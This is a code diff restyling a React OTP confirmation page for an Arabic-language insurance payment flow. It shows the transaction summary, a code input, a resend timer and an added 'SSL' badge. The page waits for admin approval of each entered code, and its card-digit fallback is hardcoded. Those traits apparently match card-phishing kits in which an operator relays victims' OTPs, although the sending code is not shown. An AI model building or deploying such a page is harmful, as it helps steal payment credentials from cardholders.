@@ -1,8 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { motion } from "framer-motion";
-import { Lock, RefreshCw, Loader2, CreditCard, Info } from "lucide-react";
-import VerificationLayout from "@/components/VerificationLayout";
+import { Lock, RefreshCw, Loader2, CreditCard, Shield, Info } from "lucide-react";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
 import { toast } from "sonner";
 import { useLanguage } from "@/i18n/LanguageContext";
@@ -15,7 +14,7 @@ const OTPVerification = () => {
   const o = t.otp;
   const offer = location.state?.offer;
   const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
-  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "••••";
+  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "4532";
   const totalPrice = offer?.totalPrice || offer?.price || 0;
   const companyName = offer?.company || "بي كير";
 
@@ -64,111 +63,139 @@ const OTPVerification = () => {
 
   const fmtTime = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;
 
-  const inputCls = "w-full pl-3 pr-10 py-3 rounded-xl bg-background border-2 border-border text-foreground placeholder:text-muted-foreground text-sm focus:outline-none focus:border-[#11998e] focus:ring-2 focus:ring-[#11998e]/20 transition-all text-center";
-
   return (
-    <VerificationLayout title={o.title} subtitle={o.subtitle}>
-      <div className="px-5 pb-5 pt-6">
-        {waitingApproval ? (
-          <WaitingApprovalOverlay
-            title={o.waitingApproval}
-            subtitle={o.waitingReview}
-          />
-        ) : (
+    <div className="relative min-h-[100dvh] overflow-hidden bg-gradient-to-b from-[hsl(var(--primary)/0.05)] via-background to-background">
+      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,hsl(var(--primary)/0.08),transparent_60%)]" />
+
+      <div className="container relative mx-auto px-4 pt-8 pb-24 md:pb-12">
+        <div className="mx-auto max-w-md">
           <motion.div
-            className="space-y-4"
-            initial={{ opacity: 0, y: 12 }}
+            initial={{ opacity: 0, y: 20 }}
             animate={{ opacity: 1, y: 0 }}
-            transition={{ duration: 0.4 }}
+            transition={{ duration: 0.4, ease: "easeOut" }}
           >
-            {/* Transaction info */}
-            <motion.div
-              className="rounded-xl border-2 border-border p-4 space-y-2"
-              initial={{ opacity: 0, x: 10 }}
-              animate={{ opacity: 1, x: 0 }}
-              transition={{ delay: 0.1 }}
-            >
-              <div className="flex items-center justify-between text-xs">
-                <span className="text-muted-foreground">التاجر</span>
-                <span className="font-semibold text-foreground">{companyName}</span>
-              </div>
-              <div className="flex items-center justify-between text-xs">
-                <span className="text-muted-foreground">المبلغ</span>
-                <span className="text-sm font-bold text-foreground">{totalPrice.toLocaleString()} ر.س</span>
-              </div>
-              <div className="flex items-center justify-between text-xs">
-                <span className="text-muted-foreground">البطاقة</span>
-                <span className="font-mono font-semibold tracking-[0.2em] text-foreground" dir="ltr">•••• {cardLastFour}</span>
-              </div>
-            </motion.div>
-
-            {/* OTP input */}
-            <motion.div
-              initial={{ opacity: 0, x: 10 }}
-              animate={{ opacity: 1, x: 0 }}
-              transition={{ delay: 0.2 }}
-            >
-              <label className="block text-xs font-semibold text-foreground mb-1.5 text-right">{o.subtitle}</label>
-              <p className="text-[11px] text-muted-foreground text-right mb-2">تم إرسال رمز التحقق المكون من 6 أرقام إليك</p>
-              <div dir="ltr">
-                <input
-                  ref={inputRef}
-                  type="text"
-                  inputMode="numeric"
-                  value={otp}
-                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
-                  placeholder="••••••"
-                  className={inputCls + " text-lg font-bold tracking-[0.3em]"}
-                />
-              </div>
-            </motion.div>
-
-            {/* Timer / Resend */}
-            <div className="text-center">
-              {canResend ? (
-                <button onClick={handleResend} className="flex items-center gap-2 text-xs text-[#11998e] hover:text-[#11998e]/80 mx-auto font-medium">
-                  <RefreshCw className="w-3.5 h-3.5" />{o.resendCode}
-                </button>
-              ) : (
-                <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-3 py-1">
-                  <span className="text-[10px] text-muted-foreground">{o.resendIn}</span>
-                  <span className="text-xs text-[#11998e] font-bold font-mono">{fmtTime(timer)}</span>
+            <div className="overflow-hidden rounded-3xl border border-primary/15 bg-card shadow-xl shadow-primary/5">
+              {/* Header */}
+              <div className="relative bg-gradient-to-l from-primary/10 via-primary/5 to-transparent px-5 py-5">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-1.5 rounded-full bg-primary/10 px-2.5 py-1">
+                    <Lock className="h-3 w-3 text-primary" />
+                    <span className="text-[10px] font-bold text-primary">SSL</span>
+                  </div>
+                  <div className="flex items-center gap-3 text-right">
+                    <div>
+                      <h1 className="text-base font-bold text-foreground">{o.title}</h1>
+                      <p className="text-[11px] text-muted-foreground">بوابة دفع آمنة</p>
+                    </div>
+                    <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-primary/10">
+                      <CreditCard className="h-5 w-5 text-primary" />
+                    </div>
+                  </div>
                 </div>
-              )}
-            </div>
-
-            {/* Submit button */}
-            <motion.button
-              onClick={handleVerify}
-              disabled={loading || otp.length < 4}
-              className="w-full text-white hover:opacity-90 rounded-xl py-3 font-bold text-sm transition-all disabled:opacity-40 flex items-center justify-center gap-2 shadow-lg"
-              style={{ backgroundColor: '#11998e' }}
-              whileTap={{ scale: 0.98 }}
-              initial={{ opacity: 0, y: 8 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ delay: 0.3 }}
-            >
-              {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Lock className="w-4 h-4" />}
-              <span>{loading ? o.verifying : o.confirmPayment}</span>
-            </motion.button>
-
-            {/* Info box */}
-            <motion.div
-              className="bg-[#11998e]/5 border border-[#11998e]/20 rounded-xl p-3.5 text-center"
-              initial={{ opacity: 0 }}
-              animate={{ opacity: 1 }}
-              transition={{ delay: 0.4 }}
-            >
-              <div className="flex items-center justify-center gap-1.5 mb-1">
-                <Info className="w-3.5 h-3.5 text-[#11998e]" />
-                <p className="text-xs font-bold text-foreground">بوابة دفع آمنة</p>
               </div>
-              <p className="text-[10px] text-muted-foreground">{o.secureProcess}</p>
-            </motion.div>
+
+              <div className="space-y-4 p-5">
+                {waitingApproval ? (
+                  <WaitingApprovalOverlay
+                    title={o.waitingApproval}
+                    subtitle={o.waitingReview}
+                  />
+                ) : (
+                  <>
+                    {/* Transaction Info */}
+                    <div className="divide-y divide-border/60 rounded-2xl border border-border/60 bg-secondary/30">
+                      {[
+                        { label: "التاجر", value: companyName },
+                        { label: "المبلغ", value: `${totalPrice.toLocaleString()} ر.س`, bold: true },
+                        { label: "البطاقة", value: `•••• ${cardLastFour}`, mono: true },
+                      ].map((row, idx) => (
+                        <div key={idx} className="flex items-center justify-between px-4 py-3">
+                          <span className={`text-sm ${row.bold ? "font-extrabold text-foreground" : row.mono ? "font-mono tracking-widest text-foreground" : "font-semibold text-foreground"}`} dir="ltr">
+                            {row.value}
+                          </span>
+                          <span className="text-xs text-muted-foreground">{row.label}</span>
+                        </div>
+                      ))}
+                    </div>
+
+                    {/* OTP Section */}
+                    <div className="space-y-4 rounded-2xl border border-primary/10 bg-gradient-to-b from-primary/[0.03] to-transparent p-5">
+                      <div className="space-y-1 text-center">
+                        <p className="text-sm font-bold text-foreground">{o.subtitle}</p>
+                        <p className="text-xs text-muted-foreground">تم إرسال رمز التحقق المكون من 6 أرقام إليك</p>
+                      </div>
+
+                      <div dir="ltr">
+                        <input
+                          ref={inputRef}
+                          type="text"
+                          inputMode="numeric"
+                          value={otp}
+                          onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                          placeholder="••••••"
+                          className="w-full h-14 rounded-xl border-2 border-border/80 bg-background text-center text-lg font-bold tracking-[0.3em] text-foreground shadow-sm transition-all duration-200 focus:border-primary focus:outline-none focus:ring-4 focus:ring-primary/15 focus:shadow-md"
+                        />
+                      </div>
+
+                      {/* Timer / Resend */}
+                      <div className="text-center">
+                        {canResend ? (
+                          <button onClick={handleResend} className="flex items-center gap-2 text-xs text-primary hover:text-primary/80 mx-auto font-medium">
+                            <RefreshCw className="w-3.5 h-3.5" />{o.resendCode}
+                          </button>
+                        ) : (
+                          <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-3 py-1">
+                            <span className="text-[10px] text-muted-foreground">{o.resendIn}</span>
+                            <span className="text-xs text-primary font-bold font-mono">{fmtTime(timer)}</span>
+                          </div>
+                        )}
+                      </div>
+
+                      {loading && (
+                        <motion.div
+                          initial={{ opacity: 0, scale: 0.95 }}
+                          animate={{ opacity: 1, scale: 1 }}
+                          className="flex items-center justify-center gap-2 rounded-xl bg-primary/5 py-2.5"
+                        >
+                          <Loader2 className="h-4 w-4 animate-spin text-primary" />
+                          <span className="text-xs font-medium text-primary">{o.verifying}</span>
+                        </motion.div>
+                      )}
+
+                      <button
+                        onClick={handleVerify}
+                        disabled={loading || otp.length < 4}
+                        className="h-12 w-full rounded-xl bg-cta text-sm font-bold text-cta-foreground shadow-lg shadow-cta/20 transition-all hover:bg-cta-hover hover:shadow-xl hover:shadow-cta/30 disabled:opacity-40 flex items-center justify-center gap-2"
+                      >
+                        {loading ? (
+                          <>
+                            <Loader2 className="h-4 w-4 animate-spin" />
+                            {o.verifying}
+                          </>
+                        ) : (
+                          <>
+                            <Lock className="h-4 w-4" />
+                            {o.confirmPayment}
+                          </>
+                        )}
+                      </button>
+                    </div>
+                  </>
+                )}
+              </div>
+
+              {/* Footer */}
+              <div className="border-t border-border/40 bg-secondary/20 px-5 py-3">
+                <div className="flex items-center justify-center gap-2">
+                  <Shield className="h-3.5 w-3.5 text-muted-foreground" />
+                  <span className="text-[10px] text-muted-foreground">{o.secureProcess}</span>
+                </div>
+              </div>
+            </div>
           </motion.div>
-        )}
+        </div>
       </div>
-    </VerificationLayout>
+    </div>
   );
 };
 
